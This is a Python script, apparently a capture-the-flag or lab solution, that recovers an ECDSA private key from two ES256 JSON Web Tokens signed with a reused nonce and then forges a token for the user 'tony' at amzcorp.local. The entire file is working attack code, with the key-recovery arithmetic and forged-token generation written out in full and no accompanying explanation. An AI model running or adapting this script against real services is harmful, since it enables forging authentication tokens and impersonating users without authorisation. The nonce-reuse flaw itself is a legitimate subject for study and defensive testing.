#!/usr/bin/python3
from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature
from Crypto.Util.number import bytes_to_long, long_to_bytes
import libnum, hashlib, sys, json, base64

def b64(data):
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def sign(msg):
    msghash = hashlib.sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def create_jwt(data):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""))
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt

jwt1 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.E3FBE4S6PUwenBNaFQLXZCv0KTGtsHHhwws_zxgRIIbRvlm_VXmX6egdPxd1wiaNbnnNA_NoDNwtIEYmdcZczQ"
jwt2 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3RpbmciLCJlbWFpbCI6InRlc3RpbmdAdGVzdGluZy5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.E3FBE4S6PUwenBNaFQLXZCv0KTGtsHHhwws_zxgRIIYKIEY1w0euhnnVyuR8_Mdgw-iTUzifLhIWKcTmpQG4Hw"

head1, data1, sig1 = jwt1.split(".")
head2, data2, sig2 = jwt2.split(".")

msg1 = f"{head1}.{data1}"
msg2 = f"{head2}.{data2}"

h1 = bytes_to_long(hashlib.sha256(msg1.encode()).digest())
h2 = bytes_to_long(hashlib.sha256(msg2.encode()).digest())

_sig1 = bytes_to_long(unb64(sig1))
_sig2 = bytes_to_long(unb64(sig2))

sig1 = Signature(_sig1 >> 256, _sig1 % (2 ** 256))
sig2 = Signature(_sig2 >> 256, _sig2 % (2 ** 256))

r1, s1 = sig1.r, sig1.s
r2, s2 = sig2.r, sig2.s

G = generator_256
q = G.order()

valinv = libnum.invmod(r1 * (s1 - s2), q)
d = (((s2 * h1) - (s1 * h2)) * (valinv)) % q

valinv = libnum.invmod((s1 - s2), q)
k = ((h1 - h2) * valinv) % q

pubkey = Public_key(G, G * d)
privkey = Private_key(pubkey, d)

data = {'username': 'tony', 'email': 'tony@amzcorp.local', 'account_status': True}

print(create_jwt(data))
